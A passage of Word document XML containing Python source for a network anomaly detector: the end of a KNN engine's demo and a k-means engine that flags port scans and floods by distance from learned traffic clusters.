      </w:r>
    </w:p>
    <w:p w14:paraId="5019C15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self._ranges = None      # rescale against the imported data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071B30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State import: KNN loaded %d signatures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391F743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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B9344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(len(self.training_data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A181FC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(%d corrected)" % corrected if corrected else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A88CD4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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D389D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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1001D663" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="318A6078" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24A3A08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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3452391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 = KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51648C8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print("feature ranges (min,max): %s" % e.feature_ranges())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1970163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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C105F5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 12, "idle host"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2785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(12, 75, "normal browsing"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564785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(25, 150, "busy browsing (CDNs, ads)"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C8BAD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(45, 50, "slow scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB47F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(400, 800, "aggressive scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8D4B7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 1500, "SYN flood - must NOT be a scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2993E90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(2, 8000, "heavy flood - must NOT be a scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5F3CC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2ABA7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ports, pkts, note in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E566F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 _ = e.classify(ports, pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4500DFD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ratio = ports / float(pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9705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print("ports=%-4d pkts=%-6d ratio=%.3f -&gt; %-7s (%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BFCDE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(ports, pkts, ratio, verdict, note))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A49E2CB"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src/engines/kmeans.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8E461D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>224 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30247B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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0294B4D3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DE9C4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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C27A8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from engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087FD5B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except ImportError:  # allow `python engines/kmeans.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3581A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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBCA14A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65846C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Cluster 0 is the idle/normal profile, 1 the high-volume profile and 2 the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244CC59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wide-port-spread profile, matching the seeded centroids below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3043E7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ANOMALY_CLUSTER = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3816D5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CLUSTER_LABELS = {0: "Idle", 1: "High Volume", 2: "Port Spread"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0C61EF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7915FF7D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BF74D4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KMeansMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395D7C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online (mini-batch) k-means - centroids drift toward live traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5281326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so the model adapts as the network changes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41775DD4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B5761A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name = "kmeans"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024978F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features = ("packets_per_second", "unique_ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B271E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73C85A0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__init__(self, k=3, learning_rate=0.1, radius_multiplier=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683378D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min_samples=8):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B0B5E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self.k = k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3EAC1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self.alpha = learning_rate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5DCEE5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FD6F26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default clusters: idle / ddos / scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441EDAC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picked manually so we don't need an offline training pass to start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBC9B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self.centroids = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A5693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[10.0, 2.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C251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[200.0, 5.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B7B28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[20.0, 50.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F48ADC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2405344" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18C70E5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Novelty detection over the *reconstruction error* - the distance from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277D6F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each observation to its nearest centroid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123CA9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C3B8C0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Testing cluster identity (the previous `cluster == 2` rule) cannot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537746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detect novelty: every point is assigned to some cluster, so traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E210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unlike anything seen before is silently absorbed into whichever</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A6063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centroid happens to be least distant. Testing distance instead is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1449A8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what turns clustering into an anomaly detector.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E350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38165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The statistics are pooled across all clusters rather than kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462CF8B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per-cluster. Attack traffic is by definition rare, so an</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464F72C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attack-region cluster would never accumulate enough observations to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F4243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finish warming up, and a per-cluster threshold would stay disabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611F75C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exactly when it was needed. Pooling means the model calibrates on the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF72F7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abundant normal traffic and is immediately usable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE5851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self.radius_multiplier = radius_multiplier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F304D9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self.min_samples = min_samples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1CE8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self.dist_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0C95C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self.dist_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D9DAE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self.dist_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AF25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self.cluster_counts = [0] * k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A306E22" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EFDCD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euclidean_distance(self, a, b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C7DF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math.sqrt(sum((x - y) ** 2 for x, y in zip(a, b)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CC9B0E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B6524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classify(self, pps, unique_ports):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0240C5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point = [float(pps), float(unique_ports)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D5617E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A09CE5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best_dist = float("inf")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453E50A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best = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A87B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 c in enumerate(self.centroids):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1487278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 = self.euclidean_distance(point, c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2005324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d &lt; best_dist:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0266A7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best_dist = d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373123E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best = i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733B8766" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DC6382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self._update_centroid(best, point)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48654A2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best</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DA51B1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="027CF4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_update_centroid(self, idx, point):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECA2B4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c_new = c_old + alpha * (point - c_old)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEB4C0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old = self.centroids[idx]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D1E9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self.centroids[idx] = [o + self.alpha * (p - o) for o, p in zip(old, point)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FDEF4F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CD2674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distances(self, pps, unique_ports):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED167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point = [float(pps), float(unique_ports)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427EC57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[self.euclidean_distance(point, c) for c in self.centroids]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146980DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E810E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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280C8C0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analyse(self, pps, unique_ports, update=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0465067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"""Assign the observation to a cluster and test it for novelty.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B6E5B8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D9784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Anomaly criterion: distance to the assigned centroid exceeds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C05F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`radius_multiplier` times that cluster's running mean radius, once the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7729291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cluster has seen at least `min_samples` observations. Before the warm-up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011B73B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threshold the radius estimate is meaningless, so nothing is flagged and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1531F0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the engine cannot produce start-up false positives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DC406B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17A01FA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Confidence is how far beyond the radius the point sits, capped at 1.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EC071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1DD7DB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dists = self.distances(pps, unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFE9D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best = min(range(len(dists)), key=lambda i: dists[i])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFED4D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nearest = dists[best]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2136FF83" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55F5172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mean, std = self.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368660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warm = self.dist_count &gt;= self.min_samples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2487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mu + k*sigma, falling back to a multiple of the mean when the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007C60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observed distances have not varied at all (std == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7ECDB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limit = (mean + self.radius_multiplier * std if std &gt; 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A68EE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else mean * self.radius_multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC59D79" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7136E5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is_threat = bool(warm and limit &gt; 0 and nearest &gt; limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FFEE7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1 - limit/distance rises monotonically toward 1 without ever</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326CF55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reaching it, so "far outside the threshold" and "extremely far</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190E0DB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outside" remain distinguishable instead of both clamping to 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2FDA0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confidence = (1.0 - (limit / nearest)) if is_threat else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CCF8A5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="236B963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update and not is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716E0E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Only non-anomalous points are folded into the model, so a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2631F46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sustained attack cannot drag a centroid onto itself and then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65799C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declare the traffic normal (the same poisoning guard the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05699A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Z-Score engine applies to its baseline).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5C01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self.cluster_counts[best] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C5727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self.dist_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC64A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delta = nearest - self.dist_mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1E4A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self.dist_mean += delta / self.dist_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B16AC9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self.dist_m2 += delta * (nearest - self.dist_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE7230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self._update_centroid(best, [float(pps), float(unique_ports)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213769AF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65DE23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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160510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CLUSTER_LABELS.get(best, "Cluster %d" % best),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4DB29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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC9BD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detail={"cluster": best, "distance": round(nearest, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C684B4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"mean_distance": round(mean, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381D1C3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"threshold": round(limit, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD13F8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"samples": self.dist_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297E0E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"centroid": [round(v, 2) for v in self.centroids[best]]},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64013D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is_threat=is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA0F7C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04F0B9A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="137CD92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distance_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A38E9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"""Mean and population std-dev of nearest-centroid distance (Welford)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A17C5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self.dist_count &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062BCE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self.dist_mean, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599A131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self.dist_mean, math.sqrt(self.dist_m2 / self.dist_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC4D9A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C99CF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train(self, points, iters=25, tolerance=1e-3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B6A70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"""Batch Lloyd's algorithm to place the initial centroids.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513317CD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="302506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Online updates then let the centroids drift with live traffic, but a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176E1CA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batch pass first gives them a data-driven starting position instead of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764EAE4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the hand-picked seeds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4380B1A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B2D62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pts = [[float(v) for v in p] for p in points]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573A4F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len(pts) &lt; self.k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7313926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raise ValueError("need at least %d points" % self.k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E39490" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C745E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step = max(1, len(pts) // self.k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D2B1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self.centroids = [list(pts[i * step]) for i in range(self.k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F7EBA2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631763E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_ in range(iters):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13600A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groups = [[] for _ in range(self.k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669106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p in pts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AFC6D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idx = min(range(self.k),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466BA74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key=lambda i: self.euclidean_distance(p, self.centroids[i]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFE31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groups[idx].append(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C0D73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moved = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250DAB7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 group in enumerate(groups):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187763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group:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373D51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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46701A0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new = [sum(m[j] for m in group) / len(group)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A4126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j in range(len(group[0]))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1263D82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moved += self.euclidean_distance(self.centroids[i], new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B685A5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self.centroids[i] = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5E6C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moved &lt; tolerance:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A87CDE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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F3B06C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DC409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inertia = sum(min(self.euclidean_distance(p, c) ** 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A9C36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c in self.centroids) for p in pts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB94F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print("[KM ] %d centroids on %d points: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333D3D2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(self.k, len(pts), [[round(v, 2) for v in c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F60B2C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c in self.centroids]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB838F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{"points": len(pts), "centroids": self.centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756D40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"inertia": round(inertia, 3)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B525A9A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
